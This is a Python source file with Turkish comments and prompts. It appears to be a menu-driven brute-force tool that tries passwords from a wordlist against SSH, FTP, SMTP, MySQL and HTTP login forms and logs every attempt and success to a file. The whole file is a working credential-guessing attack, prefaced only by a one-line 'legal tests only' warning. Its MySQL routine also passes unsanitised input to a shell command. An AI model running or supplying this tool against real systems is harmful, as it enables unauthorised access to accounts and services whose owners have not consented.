#!/usr/bin/env python3
import socket
import paramiko
import ftplib
import smtplib
import requests
import subprocess
from threading import Thread
from datetime import datetime

# Renkli çıktılar
class colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    END = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

# Log sistemi
def log_kaydet(protokol, hedef, kullanici, sifre=None, durum="DENENDİ"):
    with open("bruteforce_logs.txt", "a") as f:
        tarih = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        log = f"[{tarih}] {protokol.upper()} | {hedef} | {kullanici}"
        if sifre:
            log += f" | {sifre}"
        log += f" | {durum}\n"
        f.write(log)

# SSH Bruteforce
def ssh_bruteforce(host, port, username, wordlist, timeout=5):
    print(f"\n{colors.CYAN}🔓 SSH Bruteforce başlatıldı ({host}:{port})...{colors.END}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(wordlist, "r", errors="ignore") as f:
        for password in f:
            password = password.strip()
            try:
                ssh.connect(host, port=port, username=username, password=password, timeout=timeout, banner_timeout=30)
                print(f"\n{colors.GREEN}✅ BAŞARILI! {username}:{password}{colors.END}")
                log_kaydet("ssh", host, username, password, "BAŞARILI")
                ssh.close()
                return True
            except Exception as e:
                print(f"{colors.RED}❌ Denenen: {password.ljust(20)}{colors.END}", end="\r")
                log_kaydet("ssh", host, username, password)
    print(f"\n{colors.YELLOW}🔐 Şifre bulunamadı.{colors.END}")
    return False

# FTP Bruteforce
def ftp_bruteforce(host, port, username, wordlist, timeout=5):
    print(f"\n{colors.CYAN}📁 FTP Bruteforce başlatıldı ({host}:{port})...{colors.END}")
    
    with open(wordlist, "r", errors="ignore") as f:
        for password in f:
            password = password.strip()
            try:
                ftp = ftplib.FTP(timeout=timeout)
                ftp.connect(host, port)
                ftp.login(username, password)
                print(f"\n{colors.GREEN}✅ BAŞARILI! {username}:{password}{colors.END}")
                log_kaydet("ftp", host, username, password, "BAŞARILI")
                ftp.quit()
                return True
            except Exception as e:
                print(f"{colors.RED}❌ Denenen: {password.ljust(20)}{colors.END}", end="\r")
                log_kaydet("ftp", host, username, password)
    print(f"\n{colors.YELLOW}🔐 Şifre bulunamadı.{colors.END}")
    return False

# SMTP Bruteforce
def smtp_bruteforce(host, port, username, wordlist, timeout=5):
    print(f"\n{colors.CYAN}📧 SMTP Bruteforce başlatıldı ({host}:{port})...{colors.END}")
    
    with open(wordlist, "r", errors="ignore") as f:
        for password in f:
            password = password.strip()
            try:
                server = smtplib.SMTP(host, port, timeout=timeout)
                server.starttls()
                server.login(username, password)
                print(f"\n{colors.GREEN}✅ BAŞARILI! {username}:{password}{colors.END}")
                log_kaydet("smtp", host, username, password, "BAŞARILI")
                server.quit()
                return True
            except Exception as e:
                print(f"{colors.RED}❌ Denenen: {password.ljust(20)}{colors.END}", end="\r")
                log_kaydet("smtp", host, username, password)
    print(f"\n{colors.YELLOW}🔐 Şifre bulunamadı.{colors.END}")
    return False

# MySQL Bruteforce
def mysql_bruteforce(host, port, username, wordlist, timeout=5):
    print(f"\n{colors.CYAN}🗃️ MySQL Bruteforce başlatıldı ({host}:{port})...{colors.END}")
    
    try:
        subprocess.run(["mysql"], check=True, capture_output=True)
    except:
        print(f"{colors.RED}❌ MySQL client kurulu değil!{colors.END}")
        print(f"{colors.YELLOW}Termux'ta kurmak için: pkg install mariadb{colors.END}")
        return False
    
    with open(wordlist, "r", errors="ignore") as f:
        for password in f:
            password = password.strip()
            try:
                cmd = f"mysql -h {host} -P {port} -u {username} -p{password} -e 'QUIT'"
                result = subprocess.run(cmd, shell=True, timeout=timeout, capture_output=True)
                if result.returncode == 0:
                    print(f"\n{colors.GREEN}✅ BAŞARILI! {username}:{password}{colors.END}")
                    log_kaydet("mysql", host, username, password, "BAŞARILI")
                    return True
                print(f"{colors.RED}❌ Denenen: {password.ljust(20)}{colors.END}", end="\r")
                log_kaydet("mysql", host, username, password)
            except:
                pass
    print(f"\n{colors.YELLOW}🔐 Şifre bulunamadı.{colors.END}")
    return False

# HTTP Form Bruteforce
def http_form_bruteforce(url, username, wordlist, username_field="username", password_field="password", timeout=5):
    print(f"\n{colors.CYAN}🌐 HTTP Form Bruteforce başlatıldı...{colors.END}")
    
    with open(wordlist, "r", errors="ignore") as f:
        for password in f:
            password = password.strip()
            try:
                data = {username_field: username, password_field: password}
                r = requests.post(url, data=data, timeout=timeout)
                
                if "login failed" not in r.text.lower() and "invalid" not in r.text.lower():
                    print(f"\n{colors.GREEN}✅ BAŞARILI! {username}:{password}{colors.END}")
                    log_kaydet("http_form", url, username, password, "BAŞARILI")
                    return True
                print(f"{colors.RED}❌ Denenen: {password.ljust(20)}{colors.END}", end="\r")
                log_kaydet("http_form", url, username, password)
            except Exception as e:
                print(f"{colors.RED}❌ Hata: {str(e)}{colors.END}")
    print(f"\n{colors.YELLOW}🔐 Şifre bulunamadı.{colors.END}")
    return False

# Ana menü
def menu():
    print(f"""
    {colors.HEADER}
    ╔══════════════════════════════════╗
    ║    {colors.BOLD}GELİŞMİŞ BRUTEFORCE TOOL{colors.END}{colors.HEADER}    ║
    ╠══════════════════════════════════╣
    ║ 1. SSH Bruteforce                ║
    ║ 2. FTP Bruteforce                ║
    ║ 3. SMTP Bruteforce               ║
    ║ 4. MySQL Bruteforce              ║
    ║ 5. HTTP Form Bruteforce          ║
    ║                                  ║
    ║ 0. Çıkış                         ║
    ╚══════════════════════════════════╝{colors.END}
    """)
    return input(f"{colors.BLUE}Seçim (1-5/0): {colors.END}")

def main():
    print(f"\n{colors.YELLOW}⚠️ Bu araç sadece yasal testler için kullanılmalıdır!{colors.END}")
    
    while True:
        secim = menu()
        
        if secim == "0":
            print(f"\n{colors.YELLOW}Çıkış yapılıyor...{colors.END}")
            break
            
        elif secim in ["1", "2", "3", "4", "5"]:
            try:
                if secim in ["1", "2", "3", "4"]:
                    host = input("Hedef IP/Host: ")
                    port = int(input("Port: "))
                username = input("Kullanıcı adı: ")
                wordlist = input("Wordlist dosya yolu: ")
                
                start_time = time.time()
                
                if secim == "1":
                    ssh_bruteforce(host, port, username, wordlist)
                elif secim == "2":
                    ftp_bruteforce(host, port, username, wordlist)
                elif secim == "3":
                    smtp_bruteforce(host, port, username, wordlist)
                elif secim == "4":
                    mysql_bruteforce(host, port, username, wordlist)
                elif secim == "5":
                    url = input("Login form URL: ")
                    username_field = input("Username field adı [varsayılan: username]: ") or "username"
                    password_field = input("Password field adı [varsayılan: password]: ") or "password"
                    http_form_bruteforce(url, username, wordlist, username_field, password_field)
                
                print(f"\n{colors.BLUE}⏱️ Toplam süre: {time.time()-start_time:.2f} saniye{colors.END}")
                
            except Exception as e:
                print(f"\n{colors.RED}❌ Hata: {str(e)}{colors.END}")
            
            input(f"\n{colors.YELLOW}Devam etmek için Enter'a basın...{colors.END}")
            
        else:
            print(f"\n{colors.RED}❌ Geçersiz seçim!{colors.END}")

if __name__ == "__main__":
    import time
    main()